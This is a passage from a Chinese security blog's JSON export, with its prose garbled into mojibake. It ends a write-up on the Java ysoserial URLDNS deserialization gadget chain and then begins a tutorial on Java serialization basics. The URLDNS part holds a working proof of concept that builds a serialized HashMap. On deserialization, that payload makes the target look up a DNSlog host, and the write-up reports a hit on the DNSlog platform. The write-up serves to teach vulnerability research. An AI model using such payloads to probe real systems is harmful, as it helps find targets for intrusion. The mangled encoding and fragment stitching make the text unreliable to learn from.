å…¥çš„urlï¼Œåœ¨è°ƒç”¨getHostAddressæ–¹æ³•æ—¶ï¼Œå°±ä¼šè¿›è¡ŒDNSæŸ¥è¯¢ï¼Œæ–¹æ³•æºä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 synchronized InetAddress getHostAddress() { if (hostAddress != null) { return hostAddress; } if (host == null || host.isEmpty()) { return null; } try { hostAddress = InetAddress.getByName(host); } catch (UnknownHostException | SecurityException ex) { return null; } return hostAddress; } è¿™é‡Œçš„InetAddress.getByName(host)çš„ä½œç”¨æ˜¯æ ¹æ®ä¸»æœºåï¼Œè·å–å…¶IPåœ°å€ï¼Œåœ¨ç½‘ç»œä¸Šå…¶å®å°±æ˜¯ä¸€æ¬¡DNSæŸ¥è¯¢ã€‚\nå¤§è‡´å®Œç»“ï¼Œæ‹‰é€šä¸€ä¸‹ï¼Œysoserialé“¾çš„åºåˆ—åŒ–è¿‡ç¨‹ï¼š\nä½¿ç”¨è‡ªå®šä¹‰çš„URLDNSç±»çš„getObject()æ–¹æ³•è·å–åˆ°payloadï¼Œé‡ç‚¹æ˜¯getObjectæ–¹æ³•ï¼Œä¸‹é¢æ¥è¯´ä¸€ä¸‹æ–¹æ³•çš„æµç¨‹ ï¼ˆåœ¨è¿™ä¸ªæ–¹æ³•ä¸­ï¼Œåœ¨getObject()æ–¹æ³•ç¬¬ä¸€è¡Œæˆ‘ä»¬å®šä¹‰äº†handlerï¼Œå¹¶å°†å…¶è‡ªå®šä¹‰çš„SilentURLStreamHandlerç±»å®ä¾‹åŒ–èµ‹å€¼ç»™handlerã€‚ åœ¨ç¬¬äºŒè¡Œæˆ‘ä»¬å®ä¾‹åŒ–äº†ä¸€ä¸ªHashMapç±»ã€‚ åœ¨ç¬¬ä¸‰è¡Œå®ä¾‹åŒ–äº†ä¸€ä¸ªURLç±»ï¼Œæ­¤æ—¶URLç±»ä¸­çš„handlerå¯¹åº”çš„å¯¹è±¡ä¸ºæˆ‘ä»¬è‡ªå®šä¹‰çš„SilentURLStreamHandlerç±»å¹¶ä¸”æ³¨æ„æˆ‘ä»¬åœ¨è¿™ä¸ªç±»ä¸­é‡å†™äº†getHostAddress()æ–¹æ³• åœ¨ç¬¬å››è¡Œä½¿ç”¨äº†HashMapç±»çš„putæ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•çš„æºç åœ¨å‰é¢è¯´è¿‡ï¼Œæœ¬è´¨å·®ä¸å¤šï¼Œå¤§è‡´ä¸ºHashMap#putVal()-\u0026gt;HashMap#hash-\u0026gt;URL#hashCode-\u0026gt;handlerå¯¹è±¡#hashCodeã€‚æ³¨æ„ï¼Œç”±äºæ­¤æ—¶çš„handlerä¸ºæˆ‘ä»¬é‡å†™çš„ç±»ï¼Œæ‰€ä»¥æœ€ç»ˆä¼šè°ƒç”¨æˆ‘ä»¬é‡å†™çš„getHostAddress()æ–¹æ³•ï¼Œä½†æ˜¯æ­¤æ—¶ä¼šè¿”å›nullï¼Œæ‰€ä»¥å¹¶ä¸ä¼šå‘èµ·è¯·æ±‚ã€‚ åœ¨ç¬¬äº”è¡Œæˆ‘ä»¬æœ¬è´¨ä¸Šæ˜¯è°ƒç”¨äº†åå°„æ¥æ›´æ”¹hashCodeçš„å€¼ä¸º-1ï¼Œè¿™æ˜¯å› ä¸ºæˆ‘ä»¬åœ¨å‰é¢è°ƒç”¨URL#HashCodeæ—¶ä¼šå°†ç±»é‡Œçš„hashCodeæ”¹å€¼ï¼Œè¿™æ ·ä¼šå¯¼è‡´URLç±»é‡Œé¢çš„hashCodeå€¼ä¸ä¸º-1ï¼Œæ‰€ä»¥éœ€è¦åå°„æ”¹å€¼ï¼Œè¿™æ ·æ‰èƒ½ä¿è¯åœ¨URLç±»é‡Œçš„hashCode()æ–¹æ³•èƒ½è·³åˆ°URLStreamHandlerç±»ä¸­ã€‚ï¼‰ æœ€ç»ˆè·å–åˆ°è¿™ä¸ªpayloadåä¼šå°†å…¶åºåˆ—åŒ–ï¼Œæˆ‘ä»¬åªéœ€è¦å°†å…¶ååºåˆ—åŒ–å³å¯è®¿é—®ã€‚ è¿™é‡Œçš„æµç¨‹ä¹ŸåŸºæœ¬å°†å‰é¢è®²çš„å‡ ä¸ªéœ€è¦æ³¨æ„çš„ç‚¹éƒ½è¯´æ˜äº†ï¼Œè¿™é‡Œå°±ä¸å¤šè¯´äº†ã€‚\nååºè¿‡ç¨‹ï¼š\nååºHashMapç±»ï¼Œä¼šè°ƒç”¨HashMapç±»çš„readObject()æ–¹æ³•ï¼Œå…¶å®å’Œå‰é¢éƒ½å¤§å·®ä¸å·®ã€‚ å¯ä»¥è‡ªå·±ç¼–å†™ä¸€ä¸ªPOCï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 package java_foundation; import java.net.InetAddress; import java.net.URL; import java.net.URLConnection; import java.net.URLStreamHandler; import java.util.HashMap; import java.lang.reflect.Field; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.io.FileOutputStream; import java.io.FileInputStream; public class Main { public static void main(String[] args) throws Exception { HashMap hashMap = new HashMap(); URLStreamHandler urlStream = new haha(); URL url = new URL(null,\u0026#34;https://rcpbxasvzr.yutu.eu.org\u0026#34;,urlStream); hashMap.put(url,\u0026#34;fupanc\u0026#34;); Field field = URL.class.getDeclaredField(\u0026#34;hashCode\u0026#34;); field.setAccessible(true); field.set(url,-1); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hashMap); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } } class haha extends URLStreamHandler{ protected URLConnection openConnection(URL u){ return null; } protected synchronized InetAddress getHostAddress(URL u) { return null; } } æˆåŠŸåœ¨DNSlogå¹³å°ä¸Šæœ‰å›æ˜¾ã€‚\nå‚è€ƒæ–‡ç« ï¼š\nhttps://blog.csdn.net/qq_48201589/article/details/136049878\nhttps://xz.aliyun.com/t/9417?time__1311=n4%2BxuDgD9AYCqGKDQeDsR32xmrU1bKzte34D\u0026amp;alichlgref=https%3A%2F%2Fcn.bing.com%2F\nhttps://nivi4.notion.site/Java-URLDNS-e9820d5abc6e402abcaf69ef876f74c0\n","date":"2025-01-22T13:25:53+08:00","permalink":"https://fupanc-w1n.github.io/p/urldns/","title":"URLDNS"},{"content":"Javaååºåˆ—åŒ– åœ¨Javaä¸­ï¼Œåºåˆ—åŒ–è¿‡ç¨‹åˆ†ä¸ºä¸¤å¤§éƒ¨åˆ†ï¼šåºåˆ—åŒ–å’Œååºåˆ—åŒ–ã€‚\nåºåˆ—åŒ–ï¼šå°†å¯¹è±¡çš„çŠ¶æ€è½¬æ¢ä¸ºå¯å­˜å‚¨æˆ–ä¼ è¾“çš„æ ¼å¼çš„è¿‡ç¨‹ã€‚ä¾‹å¦‚ï¼Œå°†å¯¹è±¡è½¬æ¢ä¸ºå­—èŠ‚æµæˆ–æ–‡æœ¬æ ¼å¼ï¼ˆå¦‚ JSONã€XML ç­‰ï¼‰ã€‚è¿™æ ·å¯ä»¥å°†å¯¹è±¡ä¿å­˜åˆ°æ–‡ä»¶ã€æ•°æ®åº“æˆ–è€…é€šè¿‡ç½‘ç»œä¼ è¾“ã€‚ ååºåˆ—åŒ–ï¼šå°†åºåˆ—åŒ–åçš„æ•°æ®æ¢å¤ä¸ºå¯¹è±¡çš„è¿‡ç¨‹ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå°†å­—èŠ‚æµæˆ–æ–‡æœ¬æ ¼å¼çš„æ•°æ®é‡æ–°è½¬æ¢ä¸ºå†…å­˜ä¸­çš„å¯¹è±¡ã€‚ è¿™ä¸¤éƒ¨åˆ†å…±åŒæ„æˆäº†åºåˆ—åŒ–è¿‡ç¨‹ï¼Œç¡®ä¿å¯¹è±¡å¯ä»¥è¢«æŒä¹…åŒ–å­˜å‚¨æˆ–è¿œç¨‹ä¼ è¾“ï¼Œå¹¶åœ¨éœ€è¦æ—¶æ¢å¤åŸå§‹çš„å¯¹è±¡çŠ¶æ€ã€‚\nå¦‚ä½•å®ç° åœ¨Javaä¸­å®ç°å¯¹è±¡ååºåˆ—åŒ–éå¸¸ç®€å•ï¼Œå®ç°java.io.Serializableï¼ˆå†…éƒ¨åºåˆ—åŒ–ï¼‰æˆ–java.io.Externalizableï¼ˆå¤–éƒ¨åºåˆ—åŒ–ï¼‰æ¥å£å³å¯è¢«åºåˆ—åŒ–ã€‚ä¸‹é¢æœ‰å‡ ä¸ªç‚¹éœ€è¦è¯´æ˜ï¼š\nSerializable æ¥å£ æºä»£ç å¦‚ä¸‹ï¼š\n1 2 public interface Serializable { } ä¸€ä¸ªå¯¹è±¡æƒ³è¦è¢«åºåˆ—åŒ–ï¼Œé‚£ä¹ˆå®ƒçš„ç±»å°±è¦å®ç°æ­¤æ¥å£æˆ–è€…å®ƒçš„å­æ¥å£ã€‚\nè¿™ä¸ªå¯¹è±¡çš„æ‰€æœ‰å±æ€§ï¼ˆåŒ…æ‹¬privateå±æ€§å’Œå…¶å¼•ç”¨çš„å¯¹è±¡ï¼‰éƒ½å¯ä»¥è¢«åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ¥ä¿å­˜ã€ä¼ é€’ã€‚ä¸æƒ³åºåˆ—åŒ–çš„å­—æ®µå¯ä»¥ä½¿ç”¨transientä¿®é¥°ã€‚\nç”±äº Serializable å¯¹è±¡å®Œå…¨ä»¥å®ƒå­˜å‚¨çš„äºŒè¿›åˆ¶ä½ä¸ºåŸºç¡€æ¥æ„é€ ï¼Œå› æ­¤å¹¶ä¸ä¼šè°ƒç”¨ä»»ä½•æ„é€ å‡½æ•°ï¼Œå› æ­¤Serializableç±»æ— éœ€é»˜è®¤æ„é€ å‡½æ•°ï¼Œä½†æ˜¯å½“Serializableç±»çš„çˆ¶ç±»æ²¡æœ‰å®ç°Serializableæ¥å£æ—¶ï¼Œååºåˆ—åŒ–è¿‡ç¨‹ä¼šè°ƒç”¨çˆ¶ç±»çš„é»˜è®¤æ„é€ å‡½æ•°ï¼Œå› æ­¤è¯¥çˆ¶ç±»å¿…éœ€æœ‰é»˜è®¤æ„é€ å‡½æ•°ï¼Œå¦åˆ™ä¼šæŠ›å¼‚å¸¸ã€‚\nä½¿ç”¨transientå…³é”®å­—é˜»æ­¢åºåˆ—åŒ–è™½ç„¶ç®€å•æ–¹ä¾¿ï¼Œä½†è¢«å®ƒä¿®é¥°çš„å±æ€§è¢«å®Œå…¨éš”ç¦»åœ¨åºåˆ—åŒ–æœºåˆ¶ä¹‹å¤–ï¼Œå¯¼è‡´äº†åœ¨ååºåˆ—åŒ–æ—¶æ— æ³•è·å–è¯¥å±æ€§çš„å€¼ï¼Œè€Œé€šè¿‡åœ¨éœ€è¦åºåˆ—åŒ–çš„å¯¹è±¡çš„Javaç±»é‡ŒåŠ å…¥writeObject()æ–¹æ³•ä¸readObject()æ–¹æ³•å¯ä»¥æ§åˆ¶å¦‚ä½•åºåˆ—åŒ–å„å±æ€§ï¼Œç”šè‡³å®Œå…¨ä¸åºåˆ—åŒ–æŸäº›å±æ€§æˆ–è€…åŠ å¯†åºåˆ—åŒ–æŸäº›å±æ€§ã€‚\nåœ¨è¿™é‡Œè¿˜éœ€è¦äº†è§£ä¸€ä¸ªç‚¹ï¼Œé‚£å°±æ˜¯staticä¿®é¥°çš„å­—æ®µæ˜¯ç»‘å®šåœ¨ç±»ä¸Šçš„ï¼Œè€Œä¸æ˜¯å¯¹è±¡ä¸Šã€‚staticä¼˜å…ˆäºå¯¹è±¡å­˜åœ¨ï¼Œæ‰€ä»¥staticä¿®é¥°çš„å­—æ®µä¸ä¼šè¢«åºåˆ—åŒ–ã€‚\nExternalizable æ¥å£ å¯¹äºè¿™ä¸ªæ¥å£çš„ä½¿ç”¨å¯ä»¥å‚è€ƒæœ€åé¢çš„å‚è€ƒæ–‡ç« ã€‚\næºä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 public interface Externalizable extends java.io.Serializable { void writeExternal(ObjectOutput out) throws IOException; void readExternal(ObjectInput in) throws IOException,ClassNotFoundException; } å®ƒæ˜¯Serializableæ¥å£çš„å­ç±»ï¼Œè¿™ä¸ªæ¥å£é‡Œé¢å®šä¹‰äº†ä¸¤ä¸ªæŠ½è±¡çš„æ–¹æ³•ï¼Œç”¨æˆ·éœ€è¦é‡è½½writeExternal()å’ŒreadExternal()æ–¹æ³•ï¼Œç”¨æ¥å†³å®šå¦‚ä½•åºåˆ—åŒ–å’Œååºåˆ—åŒ–ã€‚\nå› ä¸ºåºåˆ—åŒ–å’Œååºåˆ—åŒ–æ–¹æ³•éœ€è¦è‡ªå·±å®ç°ï¼Œå› æ­¤å¯ä»¥æŒ‡å®šåºåˆ—åŒ–å“ªäº›å±æ€§ï¼Œè€Œtransientåœ¨è¿™é‡Œæ— æ•ˆã€‚\nå¯¹Externalizableå¯¹è±¡ååºåˆ—åŒ–æ—¶ï¼Œä¼šå…ˆè°ƒç”¨ç±»çš„æ— å‚æ„é€ æ–¹æ³•ï¼Œè¿™æ˜¯æœ‰åˆ«äºé»˜è®¤ååºåˆ—æ–¹å¼çš„ã€‚å¦‚æœæŠŠç±»çš„ä¸å¸¦å‚æ•°çš„æ„é€ æ–¹æ³•åˆ é™¤ï¼Œæˆ–è€…æŠŠè¯¥æ„é€ æ–¹æ³•çš„è®¿é—®æƒé™è®¾ç½®ä¸ºprivateã€é»˜è®¤æˆ–protectedçº§åˆ«ï¼Œä¼šæŠ›å‡ºjava.io.InvalidException: no valid constructorå¼‚å¸¸ï¼Œå› æ­¤Externalizableå¯¹è±¡å¿…é¡»æœ‰é»˜è®¤æ„é€ å‡½æ•°ï¼Œè€Œä¸”å¿…éœ€æ˜¯publicçš„ã€‚\nserialVersionUIDå­—æ®µ è¿™ä¸ªå­—æ®µå¯ä»¥åœ¨åºåˆ—åŒ–è¿‡ç¨‹ä¸­æ§åˆ¶åºåˆ—åŒ–çš„ç‰ˆæœ¬ã€‚ä¸€èˆ¬æ ¼å¼å°±æ˜¯ä¸‹é¢è¿™ä¸ªï¼š\nä¸€ä¸ªå¯¹è±¡æ•°æ®ï¼Œåœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼Œå¦‚æœåºåˆ—åŒ–ä¸²ä¸­çš„serialVersionUIDä¸å½“å‰å¯¹è±¡å€¼ä¸åŒï¼Œåˆ™ååºåˆ—åŒ–å¤±è´¥ï¼Œä¼šæŠ¥é”™ï¼Œå¦åˆ™æˆåŠŸã€‚\nå¦‚æœserialVersionUIDæ²¡æœ‰æ˜¾å¼ç”Ÿæˆï¼Œç³»ç»Ÿå°±ä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªã€‚å±æ€§çš„å˜åŒ–éƒ½ä¼šå¯¼è‡´è‡ªåŠ¨ç”Ÿæˆçš„serialVersionUIDå‘ç”Ÿå˜åŒ–ã€‚å¦‚æœåºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„serialVersionUIDä¸åŒï¼Œåˆ™ä¼šæŠ¥åºåˆ—åŒ–ç‰ˆæœ¬ä¸åŒçš„é”™è¯¯ã€‚\nå¦‚æœæˆ‘ä»¬ä¿æŒäº†serialVersionUIDçš„ä¸€è‡´ï¼Œåˆ™åœ¨ååºåˆ—åŒ–æ—¶ï¼Œå¯¹äºæ–°å¢çš„å­—æ®µä¼šå¡«å…¥é»˜è®¤å€¼nullï¼ˆintçš„é»˜è®¤å€¼0ï¼‰,å¯¹äºå‡å°‘çš„å­—æ®µåˆ™ç›´æ¥å¿½ç•¥ã€‚\nå…¶ä»–ç±» å¦‚ä¸Šå›¾ï¼Œç°åœ¨æˆ‘ä»¬æ¥äº†è§£ä¸€ä¸‹ObjectInputStreamå’ŒObjectOutputStreamã€‚\nObjectOutputStream è¿™ä¸ªç±»ä¸åºåˆ—åŒ–ç›¸å…³\néƒ¨åˆ†æºç å¦‚ä¸‹ï¼š\n1 2 public class ObjectOutputStream extends OutputStream implements ObjectOutput, ObjectStreamConstants {} java.io.ObjectOutputStreamç»§æ‰¿è‡ª OutputStream ç±»ï¼Œå› æ­¤å¯ä»¥å°†åºåˆ—åŒ–åçš„å­—èŠ‚åºåˆ—å†™å…¥åˆ°æ–‡ä»¶ã€ç½‘ç»œç­‰è¾“å‡ºæµä¸­ã€‚\nç°åœ¨æ¥çœ‹è¿™ä¸ªç±»çš„æ„é€ æ–¹æ³•ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 public ObjectOutputStream(OutputStream out) throws IOException { verifySubclass(); bout = new BlockDataOutputStream(out); handles = new HandleTable(10, (float) 3.00); subs = new ReplaceTable(10, (float) 3.00); enableOverride = false; writeStreamHeader(); bout.setBlockDataMode(true); if (extendedDebugInfo) { debugInfoStack = new DebugTraceInfoStack(); } else { debugInfoStack = null; } } è¯¥æ„é€ æ–¹æ³•æ¥æ”¶ä¸€ä¸ª OutputStream å¯¹è±¡ä½œä¸ºå‚æ•°ï¼Œå¹¶ä¸”åœ¨å®ä¾‹åŒ–æ—¶å°†å˜é‡enableOverrideè®¾ç½®ä¸ºfalseã€‚\nä¾‹å¦‚ï¼š\n1 2 3 4 //è¿™é‡Œä¼šåˆ›å»ºä¸€ä¸ªFileOutputStreamæµä»¥å†™å…¥æ•°æ®åˆ°Fileå¯¹è±¡æ‰€ä»£è¡¨çš„æ–‡ä»¶ FileOutputStream fos = new FileOutputStream(\u0026#34;file.txt\u0026#34;); // ObjectOutputStream oos = new ObjectOutputStream(fos); è¿™é‡Œåºåˆ—åŒ–æƒ³è¦åˆ©ç”¨å°±è¦ç”¨åˆ°ObjectOutputStreamè¿™ä¸ªç±»çš„writeObjectæ–¹æ³•ï¼ŒwriteObject()æ–¹æ³•æºç å¦‚ä¸‹ï¼š\nå‰é¢åœ¨å®ä¾‹åŒ–æ—¶å°†enableOverrideè®¾ç½®ä¸ºfalseï¼Œæ‰€ä»¥è¿™é‡ŒçœŸæ­£èµ·ä½œç”¨çš„æ˜¯writeObject0()æ–¹æ³•ã€‚\nObjectInputStream è¿™ä¸ªç±»å’Œååºåˆ—åŒ–ç›¸å…³ï¼Œå®ƒå¯ä»¥è¯»å– ObjectOutputStream å†™å…¥çš„å­—èŠ‚æµï¼Œå¹¶å°†å…¶ååºåˆ—åŒ–ä¸ºç›¸åº”çš„å¯¹è±¡ã€‚\néƒ¨åˆ†æ„é€ å‡½æ•°æºç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 public ObjectInputStream(InputStream in) throws IOException { verifySubclass(); bin = new BlockDataInputStream(in); handles = new HandleTable(10); vlist = new ValidationList(); enableOverride = false; readStreamHeader(); bin.setBlockDataMode(true); } æ ¸å¿ƒæ–¹æ³•æ˜¯readObject()ï¼Œæºç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 public final Object readObject() throws IOException, ClassNotFoundException { if (enableOverride) { return readObjectOverride(); } // if nested read, passHandle contains handle of enclosing object int outerHandle = passHandle; try { Object obj = readObject0(false); handles.markDependency(outerHandle, passHandle); ClassNotFoundException ex = handles.lookupException(passHandle); if (ex != null) { throw ex; } if (depth == 0) { vlist.doCallbacks(); } return obj; } finally { passHandle = outerHandle; if (closed \u0026amp;\u0026amp; depth == 0) { clear(); } } } å¯ä»¥çœ‹åˆ°æœ€åè¿”å›çš„æ˜¯ååºåˆ—åŒ–åçš„å¯¹è±¡ã€‚\nåºåˆ—åŒ– æµ‹è¯•ä»£ç å¦‚ä¸‹ï¼š\nTest.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 package org.example; import java.io.Serializable; class Test implements Serializable{ private String name = \u0026#34;fupanc\u0026#34; ; protected char height = \u0026#39;A\u0026#39; ; public transient String sex = \u0026#34;boy\u0026#34;; private static int age = 1111 ; public void setName(String name){ this.name=name; } public String getName(){ return this.name; } public String getSex(){ return this.sex; } public int getAge(){ return this.age; } } Main.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 package org.example; import java.io.ObjectOutputStream; import java.io.FileOutputStream; class Main{ public static void main(String[] args) throws Exception { Test p = new Test(); p.setName(\u0026#34;haha\u0026#34;); ObjectOutputStream x = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); x.writeObject(p); x.close(); } } æˆåŠŸç”Ÿæˆser.seræ–‡ä»¶ï¼Œåå…­è¿›åˆ¶æ‰“å¼€çœ‹ä¸€ä¸‹ï¼Œå¦‚ä¸‹ï¼š\nå¯ä»¥çœ‹å‡ºè¿™é‡Œåªåºåˆ—åŒ–äº†heightå’Œnameï¼Œè€Œsexå’Œageå¹¶æ²¡æœ‰è¢«åºåˆ—åŒ–ã€‚æ‰€ä»¥åœ¨è¿™é‡Œå°±å¯ä»¥çŸ¥é“æ­£å¦‚å‰é¢è¯´çš„ï¼Œä½¿ç”¨transientå’Œstaticä¿®é¥°çš„å˜é‡ä¸ä¼šè¢«åºåˆ—åŒ–ã€‚\nååºåˆ—åŒ– ååºåˆ—åŒ–å¯¹è±¡æ—¶æœ‰å¦‚ä¸‹é™åˆ¶ï¼š\nè¢«ååºåˆ—åŒ–çš„ç±»å¿…é¡»å­˜åœ¨ã€‚ serialVersionUIDå€¼å¿…é¡»ä¸€è‡´ã€‚ åŒæ ·ä½¿ç”¨ä¸Šé¢çš„Test.javaã€‚è¿™é‡Œå°±åªç»™Main.javaï¼Œååºåˆ—åŒ–ä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 package org.example; import java.io.FileInputStream; import java.io.ObjectInputStream; class Main { public static void main(String[] args) throws Exception { ObjectInputStream p = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); Test ctf = (Test)p.readObject();//è¿™é‡Œç”±äºè¿”å›ç±»å‹ä¸åŒï¼Œéœ€è¦å¼ºåˆ¶è½¬æ¢ System.out.println(\u0026#34;ååºåˆ—åŒ–åçš„name:\u0026#34;+ctf.getName()); System.out.println(\u0026#34;ååºåˆ—åŒ–åçš„sex:\u0026#34;+ctf.getSex()); System.out.println(\u0026#34;ååºåˆ—åŒ–åçš„age:\u0026#34;+ctf.getAge()); } } è¾“å‡ºç»“æœå¦‚ä¸‹ï¼š\n1 2 3 ååºåˆ—åŒ–åçš„name:haha ååºåˆ—åŒ–åçš„sex:null ååºåˆ—åŒ–åçš„age:1111 è§£è¯»ä¸€ä¸‹ç»“æœï¼š\nsexä¸ºnullï¼Œå°±æ˜¯å› ä¸ºæˆ‘åœ¨Testç±»ç”¨transientä¿®é¥°ï¼Œæ‰€ä»¥åœ¨åºåˆ—åŒ–æ—¶å¹¶ä¸ä¼šå°†sexå­—æ®µåºåˆ—åŒ–ï¼Œæ‰€ä»¥è¿™é‡Œå¹¶æ²¡æœ‰å€¼ã€‚ ageä¸º1111ï¼Œè¿™å°±ä¸staticæœ‰å…³äº†ï¼Œè¿™æ˜¯å› ä¸ºstaticä¸ºå…¨å±€å˜é‡ï¼Œåœ¨JVMä¸­æ‰€æœ‰å®ä¾‹éƒ½ä¼šå…±äº«è¯¥å­—æ®µã€‚ å¯¹æ¯”ä¸€ä¸‹ï¼Œåˆšå¥½å¯ä»¥å†è¯´æ˜ä¸€ä¸ªç‚¹\nTest.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 package org.example; import java.io.Serializable; class Test implements Serializable{ private static String name = \u0026#34;fupanc\u0026#34; ; //è¿™é‡Œæ·»åŠ static public String sex = \u0026#34;boy\u0026#34;; //è¿™é‡Œå»é™¤transient private static int age = 1111 ; public void setName(String name){ this.name=name; } public String getName(){ return this.name; } public String getSex(){ return this.sex; } public int getAge(){ return this.age; } } Main.java (çœå»åºåˆ—åŒ–è¿‡ç¨‹ï¼Œæ³¨æ„è¿™é‡Œæ˜¯å°†åºåˆ—åŒ–å’Œååºåˆ—åŒ–åˆ†å¼€è¿›è¡Œçš„)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 package org.example; import java.io.ObjectOutputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.FileInputStream; class Main{ public static void main(String[] args){ try{ //ååºåˆ—åŒ– ObjectInputStream y = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); Test ctf = (Test)y.readObject(); System.out.println(\u0026#34;ååºåˆ—åŒ–åçš„name:\u0026#34;+ctf.getName()); System.out.println(\u0026#34;ååºåˆ—åŒ–åçš„sex:\u0026#34;+ctf.getSex()); System.out.println(\u0026#34;ååºåˆ—åŒ–åçš„age:\u0026#34;+ctf.getAge()); } catch(Exception e){ e.printStackTrace(); } } } è¾“å‡ºä¸ºï¼š\n1 2 3 ååºåˆ—åŒ–åçš„name:fupanc ååºåˆ—åŒ–åçš„sex:boy ååºåˆ—åŒ–åçš„age:1111 ä»è¿™ä¸ªç»“æœå¯ä»¥æ›´åŠ è¯´æ˜staticä¿®é¥°çš„å­—æ®µä¸ä¼šè¢«åºåˆ—åŒ–çš„ç‰¹æ€§ï¼Œä»¥åŠæ›´åŠ æ¸…æ¥šäº†æ˜¯å¦ä½¿ç”¨transientç»“æœçš„ä¸åŒã€‚\nä½†æ˜¯åœ¨å‰ä¸€ä¸ªæµ‹è¯•è¿‡ç¨‹ä¸­ï¼Œå‘ç°äº†ä¸€ä¸ªé—®é¢˜ï¼Œ\nTest.javaè¿˜æ˜¯ä¹‹å‰é‚£ä¸ªï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 package org.example; import java.io.Serializable; class Test implements Serializable{ private static String name = \u0026#34;fupanc\u0026#34; ; //è¿™é‡Œæ·»åŠ static public String sex = \u0026#34;boy\u0026#34;; //è¿™é‡Œå»é™¤transient private static int age = 1111 ; public void setName(String name){ this.name=name; } public String getName(){ return this.name; } public String getSex(){ return this.sex; } public int getAge(){ return this.age; } } Main.javaå†…å®¹å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 package org.example; import java.io.ObjectOutputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.FileInputStream; class Main{ public static void main(String[] args){ try{ //åºåˆ—åŒ– Test p = new Test(); p.setName(\u0026#34;haha\u0026#34;); ObjectOutputStream x = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); x.writeObject(p); x.close(); //ååºåˆ—åŒ– ObjectInputStream y = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); Test ctf = (Test)y.readObject(); System.out.println(\u0026#34;ååºåˆ—åŒ–åçš„name:\u0026#34;+ctf.getName()); System.out.println(\u0026#34;ååºåˆ—åŒ–åçš„sex:\u0026#34;+ctf.getSex()); System.out.println(\u0026#34;ååºåˆ—åŒ–åçš„age:\u0026#34;+ctf.getAge()); } catch(Exception e){ e.printStackTrace(); } } } è¿è¡Œç»“æœï¼š\n1 2 3 ååºåˆ—åŒ–åçš„name:haha ååºåˆ—åŒ–åçš„sex:boy ååºåˆ—åŒ–åçš„age:1111 æ³¨æ„è¿™é‡Œçš„nameçš„ç»“æœä¸ºhahaï¼Œä½†æ˜¯ä¹‹å‰åˆ†å¼€åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ—¶çš„nameçš„å€¼ä¸ºfupancã€‚é‚£ä¹ˆä¸ºä»€ä¹ˆä¼šå‡ºç°è¿™æ ·çš„ç»“æœå‘¢ï¼Ÿè§£ç­”å¦‚ä¸‹ï¼ˆä¸ªäººç†è§£ï¼‰ï¼š\næœ‰æƒ³è¿‡ä¸ºä»€ä¹ˆåœ¨ååºåˆ—åŒ–çš„æ—¶å€™è¦å¼•å…¥åŒ…å—ï¼Œ\nåŒæ—¶å¯ä»¥çœ‹ç»™å‡ºæ¥çš„ser.seræ–‡ä»¶çš„åå…­è¿›åˆ¶è¡¨ç¤ºï¼Œå…¶ä¸­å¹¶æ²¡æœ‰åºåˆ—åŒ–æ–¹æ³•ï¼Œå¹¶ä¸”åªå­˜åœ¨sexï¼ˆè¿™æ˜¯å› 